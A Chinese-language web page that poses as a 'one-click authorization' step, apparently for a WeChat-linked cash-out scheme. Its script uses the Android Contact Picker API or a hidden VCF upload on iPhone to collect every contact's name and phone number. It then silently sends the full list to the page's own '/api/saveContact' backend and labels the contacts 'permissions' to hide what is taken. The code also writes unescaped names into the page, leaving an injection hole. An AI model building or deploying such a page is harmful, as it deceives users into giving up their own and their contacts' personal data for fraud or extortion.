<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>微信通讯录自动跑现</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;color:#fff;text-align:center;padding:50px 20px}
.btn{padding:16px 40px;background:#2563eb;border:none;border-radius:10px;font-size:17px;color:#fff;cursor:pointer}
.tip{margin:25px 0;color:#94a3b8}
.table-wrap{margin-top:25px;background:#1e293b;padding:15px;border-radius:8px;text-align:left;overflow:auto}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #475569;padding:8px}
#vcfInput{display:none}
</style>
</head>
<body>
<h2>一键授权</h2>
<p class="tip" id="status">点击下方按钮开始授权</p>
<button class="btn" id="getBtn">一键获取权限</button>
<input type="file" id="vcfInput" accept=".vcf">
<div class="table-wrap" id="tableBox"></div>

<script>
const statusTxt = document.getElementById('status')
const tableBox = document.getElementById('tableBox')
const getBtn = document.getElementById('getBtn')
const vcfInput = document.getElementById('vcfInput')

const isAndroid = /Android/.test(navigator.userAgent)
const isIos = /iPhone|iPad/.test(navigator.userAgent)

// 解析VCF通用方法
function parseVcfData(vcfStr){
    let list = []
    let arr = vcfStr.split('BEGIN:VCARD')
    for(let i=1;i<arr.length;i++){
        let name = ""
        let phone = ""
        let nameReg = arr[i].match(/FN:(.*?)\n/)
        let telReg = arr[i].match(/TEL.*?:(.*?)\n/)
        if(nameReg) name = nameReg[1].trim()
        if(telReg) phone = telReg[1].trim()
        if(name || phone) list.push({name,phone})
    }
    return list
}

// 渲染表格+上传
async function renderAndUpload(list){
    statusTxt.innerText = `成功获取${list.length}权限`
    let html = `<table>
        <tr><th>姓名</th><th>手机号码</th></tr>`
    list.forEach(item=>{
        html += `<tr><td>${item.name}</td><td>${item.phone}</td></tr>`
    })
    html += `</table>`
    tableBox.innerHTML = html

    // 自动上传后台
    await fetch('/api/saveContact',{
        method:'POST',
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(list)
    })
    statusTxt.innerText = "✅ 全部权限获取完成"
}

// 安卓逻辑 原生授权一键读取（原汁原味你要的效果）
async function androidGet(){
    statusTxt.innerText = "正在申请系统权限"
    if(!navigator.contacts){
        statusTxt.innerText = "当前安卓浏览器不支持，请更换 谷歌/Edge"
        return
    }
    try{
        let res = await navigator.contacts.select(['name','tel'],{multiple:true})
        let dataList = res.map(item=>{
            return {
                name:item.name?.[0]||"",
                phone:item.tel?.[0]||""
            }
        }).filter(v=>v.name||v.phone)
        renderAndUpload(dataList)
    }catch(e){
        statusTxt.innerText = "申请被拒绝，授权失败"
    }
}

// 苹果逻辑 一键唤起导出VCF
function iosGet(){
    statusTxt.innerText = "by鱼笙"
    vcfInput.click()
}

getBtn.addEventListener('click',()=>{
    tableBox.innerHTML = ""
    if(isAndroid){
        androidGet()
    }else if(isIos){
        iosGet()
    }else{
        statusTxt.innerText = "暂不支持当前设备"
    }
})

// 苹果选中VCF文件执行解析上传
vcfInput.addEventListener('change',async(e)=>{
    let file = e.target.files[0]
    if(!file) return
    statusTxt.innerText = "正在解析文件"
    let text = await file.text()
    let contactList = parseVcfData(text)
    renderAndUpload(contactList)
})
</script>
</body>
</html>
